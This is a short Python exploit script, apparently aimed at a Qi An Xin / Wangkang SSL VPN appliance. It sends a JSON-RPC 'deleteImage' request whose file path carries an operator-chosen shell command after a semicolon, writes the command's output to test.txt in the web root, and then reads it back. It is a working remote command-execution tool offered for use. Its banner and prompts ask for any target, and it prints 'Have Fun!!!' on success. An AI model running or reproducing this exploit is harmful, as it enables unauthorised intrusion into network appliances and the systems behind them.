#coding: utf-8
import requests
import re
import urllib3

G = '\033[32m'#绿
Y = '\033[33m'#黄
B = '\033[34m'#蓝
R = '\033[35m'#红
E = '\033[0m'#结束

def title():
    print(G,'<<<<<  QAX Wangkang EXP Code By lsadaharu  >>>>>',E)
    print(G,'<<<<<  Useful->python3 exp.py http/https://xxx  >>>>>',E)

def exp_code(target,path,command):
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
        'Content-Type': 'application/json'
    }
    verify_payload='{{"action":"SSLVPN_Resource","method":"deleteImage","data":[{{"data":["/var/www/html/d.txt;{} >{}/test.txt"]}}],"type":"rpc","tid":17,"f8839p7rqtj":"="}}'.format(command,path)
    try:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        verify_requests=requests.post(url=target+'/directdata/direct/router',data=verify_payload,headers=headers,verify=False,timeout=5)
        if "true" in verify_requests.text:
            print(G+"Payload Send Success,Have Fun!!!"+E)
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            verify_vul = requests.get(target+'/test.txt',verify=False,timeout=5)
            print(verify_vul.text)
    except Exception as e:
        print(R+"漏洞验证错误",e+E)

if __name__ == "__main__":
    title()
    target = str(input(Y+'Please Input Target:'+E))
    path = str(input(Y+'Please Input Web Path:'+E))
    command = str(input(Y+'Please Input Test Command:'+E))
    exp_code(target,path,command)
